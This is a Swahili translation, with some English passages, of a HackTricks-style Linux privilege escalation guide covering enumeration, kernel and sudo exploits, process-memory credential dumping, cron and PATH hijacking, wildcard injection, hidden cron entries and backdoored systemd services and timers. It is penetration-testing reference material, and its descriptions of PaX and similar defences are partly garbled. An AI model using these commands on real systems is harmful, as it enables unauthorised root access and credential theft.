# Kupandisha Hadhi ya Utekelezaji kwenye Linux

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata ufahamu wa OS inayotumika
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Ikiwa **una ruhusa ya kuandika kwenye saraka yoyote ndani ya kipengele cha `PATH`**, huenda uweze kuchukua udhibiti wa maktaba au programu za binary:
```bash
echo $PATH
```
### Taarifa za Mazingira

Je, kuna taarifa muhimu, nywila au funguo za API katika mazingira ya pembejeo?
```bash
(env || set) 2>/dev/null
```
### Mbinu za Udukuzi wa Kernel

Angalia toleo la kernel na ikiwa kuna udanganyifu wowote ambao unaweza kutumika kuongeza mamlaka.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya toleo la kernel lenye udhaifu na baadhi ya **mashambulizi yaliyokwisha ** kuhifadhiwa hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Maeneo mengine ambapo unaweza kupata baadhi ya **mashambulizi yaliyokwisha ** kuhifadhiwa: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Kuondoa toleo zote za kernel zenye udhaifu kutoka kwenye wavuti hiyo, unaweza kufanya yafuatayo:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta udhaifu wa kernel ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekeleze KATIKA mwathiriwa, inachunguza udhaifu kwa kernel 2.x tu)

Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa kwenye udhaifu wa kernel na kisha utahakikisha kuwa udhaifu huu ni halali.

### CVE-2016-5195 (DirtyCow)

Udhibiti wa Haki za Juu kwenye Linux - Kernel ya Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na toleo la sudo lenye kasoro ambazo zinaonekana katika:
```bash
searchsploit sudo
```
Unaweza kuchunguza ikiwa toleo la sudo lina kasoro kwa kutumia grep ifuatayo.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitisho wa saini ya Dmesg ulishindwa

Angalia **kisanduku cha smasher2 cha HTB** kwa **mfano** wa jinsi udhaifu huu unaweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo

To further enumerate the system, you can perform the following steps:

1. **Check for SUID/SGID binaries**: These are executables that run with the permissions of the file owner or group, which can sometimes lead to privilege escalation. Use the command `find / -perm -4000 -type f 2>/dev/null` to find SUID binaries and `find / -perm -2000 -type f 2>/dev/null` to find SGID binaries.

2. **Check for writable directories**: Look for directories that are writable by the current user but not owned by them. This can indicate potential misconfigurations or vulnerabilities. Use the command `find / -writable -type d 2>/dev/null` to find writable directories.

3. **Check for world-writable files**: World-writable files can be modified by any user on the system, which can be a security risk. Use the command `find / -perm -2 -type f 2>/dev/null` to find world-writable files.

4. **Check for cron jobs**: Cron jobs are scheduled tasks that run automatically at specified times. Check for any cron jobs that are running with elevated privileges. Use the command `crontab -l` to list the current user's cron jobs and `ls -la /etc/cron*` to check system-wide cron jobs.

5. **Check for services running as root**: Look for any services that are running with root privileges. Use the command `ps aux | grep root` to list processes running as root.

6. **Check for kernel vulnerabilities**: Check the kernel version and search for any known vulnerabilities associated with that version. Use the command `uname -a` to check the kernel version.

By performing these steps, you can gather more information about the system and potentially identify vulnerabilities or misconfigurations that can be exploited for privilege escalation.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### Tathmini ulinzi unaowezekana

### AppArmor

AppArmor ni mfumo wa usalama wa kiwango cha kernel ambao unazuia programu zisizoidhinishwa kufikia rasilimali za mfumo. Inafanya kazi kwa kuzuia programu kufanya vitendo ambavyo havijaidhinishwa na sera ya usalama iliyowekwa. AppArmor inaweza kusaidia kuzuia uchomaji wa programu zisizoidhinishwa na kudhibiti ufikiaji wa rasilimali za mfumo.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity ni jukwaa la usalama linalolenga kuimarisha usalama wa mfumo wa Linux. Inatoa seti ya vipengele vya ziada na maboresho ambayo hulinda mfumo dhidi ya mashambulizi ya kawaida ya kuharibu usalama na kuzuia upanuzi wa mamlaka.

#### Kuzuia Upanuzi wa Mamlaka

Grsecurity inatumia njia kadhaa za kuzuia upanuzi wa mamlaka kwenye mfumo wa Linux. Moja ya njia hizi ni kwa kutekeleza kinga ya kina ya kizuizi cha kufikia mamlaka ya juu kwa watumiaji na michakato. Hii inazuia watumiaji na michakato kutoka kutekeleza vitendo ambavyo vinaweza kuongeza mamlaka yao kwenye mfumo.

#### Kuzuia Mashambulizi ya Kuharibu Usalama

Grsecurity pia inatoa ulinzi dhidi ya mashambulizi ya kuharibu usalama kwa kutekeleza kinga za ziada. Hii ni pamoja na kuzuia mashambulizi ya kawaida kama vile buffer overflow, injection ya nambari, na uharibifu wa kumbukumbu. Kinga hizi zinazuia mbinu za kawaida zinazotumiwa na wadukuzi kuvunja usalama wa mfumo.

#### Ufuatiliaji wa Mfumo

Grsecurity inatoa pia zana za ufuatiliaji wa mfumo ambazo zinaweza kusaidia kugundua shughuli za kutiliwa shaka kwenye mfumo. Hii ni pamoja na uwezo wa kufuatilia vitendo vya watumiaji na michakato, kugundua mabadiliko yasiyotarajiwa kwenye faili na kumbukumbu, na kutoa ripoti za matukio ya usalama.

#### Hitimisho

Grsecurity ni jukwaa la usalama lenye nguvu ambalo linaweza kusaidia kuimarisha usalama wa mfumo wa Linux. Kwa kutekeleza kinga za ziada na zana za ufuatiliaji, inaweza kuzuia upanuzi wa mamlaka na mashambulizi ya kuharibu usalama. Ni chombo muhimu kwa wataalamu wa usalama na wahandisi wa mfumo ambao wanataka kuongeza usalama wa mfumo wao wa Linux.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX ni mfumo wa usalama wa kuzuia kutekelezwa kwa kumbukumbu (executable memory) kwenye mifumo ya Linux. Inazuia uwezekano wa kutekelezwa kwa kumbukumbu ambayo inaweza kutumiwa na wadukuzi kufanya mashambulizi ya kusambaza na kutekeleza kificho haramu.

PaX inatumia njia mbalimbali za kuzuia kutekelezwa kwa kumbukumbu, ikiwa ni pamoja na:

- **Weka kumbukumbu kuwa isiyo ya kutekelezwa (NX)**: Hii inazuia kumbukumbu kutoka kutekelezwa kama kificho.
- **Randomize kumbukumbu (ASLR)**: Hii inabadilisha eneo la kumbukumbu kwa kila mchakato, kufanya iwe vigumu kwa wadukuzi kupata maeneo sahihi ya kumbukumbu.
- **Kuzuia kutekelezwa kwa kumbukumbu (TPE)**: Hii inazuia kutekelezwa kwa kumbukumbu katika maeneo ya kawaida ya kumbukumbu, kama vile stack na heap.

PaX ni chombo muhimu katika kuhakikisha usalama wa mifumo ya Linux na kuzuia mashambulizi ya kutekeleza kificho haramu.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield ni kipengele cha usalama kinachopatikana kwenye mifumo ya Linux ambacho kinazuia shambulio la kubadilisha kumbukumbu ya programu. Kwa kufanya hivyo, inazuia uwezekano wa kutekelezwa kwa namna isiyo halali ya kificho kwenye mfumo.

Kipengele hiki kinatumia njia mbili za kuzuia shambulio la kubadilisha kumbukumbu ya programu:

1. **NX (Non-Executable) Bit**: Kwa kuweka alama ya NX kwenye kurasa za kumbukumbu ambazo zinashikilia kificho cha programu, Execshield inazuia kuruhusu utekelezaji wa kificho kwenye kurasa hizo. Hii inalinda dhidi ya shambulio la kubadilisha kumbukumbu ya programu kwa kuzuia utekelezaji wa kificho kwenye kurasa ambazo zimevamiwa.

2. **ASLR (Address Space Layout Randomization)**: Execshield inatumia ASLR kubadilisha eneo la kumbukumbu ambapo programu zinaendeshwa. Hii inafanya iwe vigumu kwa mtu mwenye nia mbaya kutabiri eneo la kumbukumbu la kificho cha programu na kutekeleza shambulio la kubadilisha kumbukumbu ya programu.

Kwa kufanya kazi pamoja, NX Bit na ASLR zinaboresha usalama wa mfumo wa Linux kwa kuzuia shambulio la kubadilisha kumbukumbu ya programu na kufanya iwe vigumu kwa wadukuzi kutekeleza shambulio la kubadilisha kumbukumbu ya programu.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux ni mfumo wa usalama wa kina uliojengwa ndani ya mfumo wa uendeshaji wa Linux. Inalenga kuzuia na kudhibiti upatikanaji wa rasilimali za mfumo kwa watumiaji na programu. SElinux inatumia sera za usalama ambazo zinaweka vizuizi vya ufikiaji kwa mchakato au faili fulani kulingana na sifa zake za usalama.

Kwa kawaida, SElinux imezimwa kwenye mifumo mingi ya Linux. Hata hivyo, kuwezesha SElinux inaweza kuongeza usalama wa mfumo kwa kuzuia uwezekano wa kufanyika kwa uchomaji wa kijijini na kusaidia kuzuia upelekaji wa programu hasidi.

Kuna njia kadhaa za kuanzisha SElinux, ikiwa ni pamoja na kubadilisha mipangilio ya faili ya usanidi na kutumia amri za kudhibiti. Baada ya kuwezesha SElinux, unaweza kusanidi sera za usalama kulingana na mahitaji yako maalum.

Kuelewa jinsi SElinux inavyofanya kazi na jinsi ya kuitumia vizuri ni muhimu katika kuhakikisha usalama wa mfumo wako wa Linux.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) ni mbinu ya usalama inayotumiwa kuzuia mashambulizi ya kufikia kwa urahisi. Inafanya hivyo kwa kubadilisha eneo la kumbukumbu ya programu na vitu vingine katika nafasi ya kumbukumbu. Hii inafanya iwe ngumu kwa wadukuzi kutabiri eneo la kumbukumbu na kutekeleza mashambulizi ya kufikia kwa urahisi.

ASLR inatumika kwa kubadilisha eneo la kumbukumbu ya sehemu tofauti za programu, kama vile maktaba za kushiriki, stack, na heap. Kwa kufanya hivyo, inaongeza ugumu wa kufikia kwa wadukuzi na inapunguza uwezekano wa kufanikiwa kwa mashambulizi ya kufikia.

ASLR inaweza kuwezeshwa kwenye mifumo ya uendeshaji ya Linux kwa kubadilisha mipangilio ya kernel. Kwa kawaida, inashauriwa kuweka ASLR kuwa moja kwa moja ili kuongeza usalama wa mfumo wako.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Kuvunja Nje ya Docker

Ikiwa uko ndani ya chombo cha docker unaweza kujaribu kutoroka kutoka kwake:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Madereva

Angalia **nini kimeunganishwa na kimefungwa**, wapi na kwa nini. Ikiwa kuna kitu chochote kilichofungwa, unaweza kujaribu kukifunga na kuangalia habari za kibinafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Tafuta programu muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **kuna compiler yoyote iliyosakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia shambulio la kernel kwa sababu inashauriwa kuikusanya kwenye kifaa ambacho utakitumia (au kwenye kifaa kama hicho).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Madoa Imewekwa

Angalia **toleo la programu na huduma zilizowekwa**. Labda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa ajili ya kuongeza mamlaka...\
Inashauriwa kuangalia kwa mkono toleo la programu iliyowekwa ambayo inaonekana kuwa ya shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye kifaa, unaweza pia kutumia **openVAS** kuangalia programu zilizopitwa na wakati na zisizo salama zilizosakinishwa kwenye kifaa.

{% hint style="info" %}
_Taarifa kwamba amri hizi zitaonyesha habari nyingi ambazo kwa kiasi kikubwa hazitakuwa na maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa ambayo itachunguza ikiwa toleo lolote la programu iliyosakinishwa lina hatari ya kushambuliwa_
{% endhint %}

## Mchakato

Angalia **mchakato gani** unatekelezwa na angalia ikiwa mchakato wowote una **mamlaka zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Hakikisha kila wakati kuna [**wadukuzi wa electron/cef/chromium** wanaofanya kazi, unaweza kuitumia kuongeza mamlaka](electron-cef-chromium-debugger-abuse.md). **Linpeas** inagundua hivyo kwa kuangalia kipengele cha `--inspect` ndani ya mstari wa amri ya mchakato.\
Pia **angalia mamlaka yako juu ya faili za michakato**, labda unaweza kubadilisha faili za mtu mwingine.

### Ufuatiliaji wa Michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa na manufaa sana katika kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji inakidhiwa.

### Kumbukumbu ya Michakato

Baadhi ya huduma za seva huhifadhi **vitambulisho kwa wazi ndani ya kumbukumbu**.\
Kawaida utahitaji **mamlaka ya mzizi** ili kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi wakati tayari una mamlaka ya mzizi na unataka kugundua vitambulisho zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

{% hint style="warning" %}
Tambua kuwa siku hizi zaidi ya mashine **haziruhusu ptrace kwa chaguo-msingi**, ambayo inamaanisha kuwa huwezi kudump michakato mingine inayomilikiwa na mtumiaji wako asiye na mamlaka.

Faili _**/proc/sys/kernel/yama/ptrace\_scope**_ inadhibiti upatikanaji wa ptrace:

* **kernel.yama.ptrace\_scope = 0**: michakato yote inaweza kufuatiliwa, ikiwa tu ina uid sawa. Hii ndiyo njia ya kawaida ya jinsi ptracing ilivyofanya kazi.
* **kernel.yama.ptrace\_scope = 1**: inaweza kufuatiliwa tu mchakato wa mzazi.
* **kernel.yama.ptrace\_scope = 2**: Mtu anayeweza kutumia ptrace ni msimamizi tu, kwani inahitaji uwezo wa CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Hakuna michakato inayoweza kufuatiliwa na ptrace. Mara ilipowekwa, ni lazima uanzishe tena ili kuwezesha kufuatilia tena.
{% endhint %}

#### GDB

Ikiwa una ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta vitambulisho ndani yake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho cha mchakato kilichopewa, **maps huonyesha jinsi kumbukumbu inavyounganishwa ndani ya nafasi ya anwani ya kawaida ya mchakato huo**; pia inaonyesha **ruhusa za kila eneo lililoandikwa**. **Faili ya mem** ya uwongo inaonyesha **kumbukumbu ya mchakato yenyewe**. Kutoka kwa faili ya **maps tunajua ni eneo gani la kumbukumbu linaloweza kusomwa** na vipindi vyao. Tunatumia habari hii ku **tafuta ndani ya faili ya mem na kudump eneo zote zinazoweza kusomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa kumbukumbu **fizikia** ya mfumo, sio kumbukumbu ya kawaida. Nafasi ya anwani ya kumbukumbu ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na mtumiaji mwenye **mamlaka ya juu** (root) na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux la zana ya kisasa ya ProcDump kutoka kwa mkusanyiko wa zana za Sysinternals kwa Windows. Pata hiyo katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Kwa kudumpisha kumbukumbu ya mchakato, unaweza kutumia:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mkono na kudumpisha mchakato unaomilikiwa na wewe
* Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (inahitaji root)

### Vitambulisho kutoka Kumbukumbu ya Mchakato

#### Mfano wa Mkono

Ikiwa utagundua kuwa mchakato wa kuthibitisha unafanya kazi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kudump mchakato (angalia sehemu zilizotangulia kupata njia tofauti za kudump kumbukumbu ya mchakato) na kutafuta nyaraka za kibali ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itaiba **vitambulisho vya maandishi wazi kutoka kumbukumbu** na kutoka kwa **faili maarufu**. Inahitaji mamlaka ya mizizi ili kufanya kazi vizuri.

| Kipengele                                           | Jina la Mchakato         |
| ------------------------------------------------- | -------------------- |
| Nywila ya GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Unganisho za FTP za Aktive)                   | vsftpd               |
| Apache2 (Vikao vya Msingi vya HTTP vya Aktive)         | apache2              |
| OpenSSH (Vikao vya SSH vya Aktive - Matumizi ya Sudo)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi Zilizopangwa/Cron

Angalia kama kuna kazi iliyopangwa inayoweza kuwa na udhaifu. Labda unaweza kutumia script inayotekelezwa na root (udhaifu wa wildcard? unaweza kubadilisha faili ambazo root anatumia? tumia symlinks? tengeneza faili maalum kwenye saraka ambayo root anatumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Tazama jinsi mtumiaji "user" ana ruhusa ya kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji wa root anajaribu kutekeleza amri au skripti fulani bila kuweka njia. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata kikao cha root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kutumia script na wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina " **\*** " ndani ya amri, unaweza kutumia hii kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa alama ya wilcard inaandamana na njia kama** _**/baadhi/ya/njia/\***_ **, sio hatari (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia alama za wildcard:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Kubadilisha skripti ya Cron na symlink

Ikiwa **unaweza kubadilisha skripti ya Cron** inayotekelezwa na root, unaweza kupata kikao cha amri kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, labda itakuwa muhimu kufuta saraka hiyo na **kuunda saraka ya symlink kwa nyingine** inayohudumia script inayodhibitiwa na wewe.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Kazi za cron mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato inayotekelezwa kila baada ya dakika 1, 2 au 5. Labda unaweza kunufaika na hilo na kuongeza mamlaka.

Kwa mfano, ili **kufuatilia kila baada ya 0.1s kwa dakika 1**, **panga kwa amri chache zilizotekelezwa** na futa amri ambazo zimefanywa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Kazi za cron zisizoonekana

Inawezekana kuunda kazi ya cron **kwa kuweka kurasa baada ya maoni** (bila herufi ya mstari mpya), na kazi ya cron itafanya kazi. Mfano (zingatia herufi ya kurasa):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** mlango wako wa nyuma wakati huduma inapoanza, inapoanza tena au inaposimamishwa (labda utahitaji kusubiri hadi mashine iwe imezimwa).\
Kwa mfano, tengeneza mlango wako wa nyuma ndani ya faili ya .service na **`ExecStart=/tmp/script.sh`**

### Programu za huduma zinazoweza kuandikwa

Kumbuka kuwa ikiwa una **ruhusa ya kuandika kwenye programu zinazotekelezwa na huduma**, unaweza kuzibadilisha kwa milango ya nyuma ili wakati huduma zinapotekelezwa tena, milango ya nyuma itatekelezwa.

### systemd PATH - Njia za Kihesabu

Unaweza kuona NJIA inayotumiwa na **systemd** na:
```bash
systemctl show-environment
```
Ikiwa utagundua kuwa unaweza **kuandika** kwenye folda yoyote ya njia, huenda uweze **kuongeza mamlaka**. Unahitaji kutafuta **njia za kihusiano zinazotumiwa kwenye faili za usanidi wa huduma** kama vile:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **faili linaloweza kutekelezwa** na **jina sawa na njia ya kibinamizi ya binary** ndani ya saraka ya PATH ya systemd ambapo unaweza kuandika, na wakati huduma inaulizwa kutekeleza hatua inayoweza kudhurika (**Anza**, **Simamisha**, **Pakia tena**), **mlango wako wa nyuma utatekelezwa** (watumiaji wasio na mamlaka kawaida hawawezi kuanza/kuacha huduma lakini angalia ikiwa unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Wakati**

**Wakati** ni faili za kitengo za systemd ambazo jina lake linamalizika kwa `**.timer**` ambazo hudhibiti faili au matukio ya `**.service**`. **Wakati** unaweza kutumika kama mbadala wa cron kwani una msaada uliojengwa kwa matukio ya wakati wa kalenda na matukio ya wakati wa monotonic na yanaweza kukimbia kwa njia isiyo sawa.

Unaweza kuchunguza orodha ya wakati zote kwa kutumia:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kufanya iweze kutekeleza sehemu za systemd.unit zilizopo (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit inayotumika wakati timer huu unapomalizika. Hoja ni jina la unit, ambayo sio ".timer". Ikiwa haijaspecify, thamani hii inakuwa default kwa huduma ambayo ina jina sawa na unit ya timer, isipokuwa kwa kisitiri. (Tazama hapo juu.) Inapendekezwa kuwa jina la unit inayotumiwa na jina la unit ya timer ziitwe sawa, isipokuwa kwa kisitiri.

Kwa hivyo, ili kutumia ruhusa hii unahitaji:

* Kupata unit ya systemd (kama `.service`) ambayo inatekeleza binary inayoweza kuandikwa
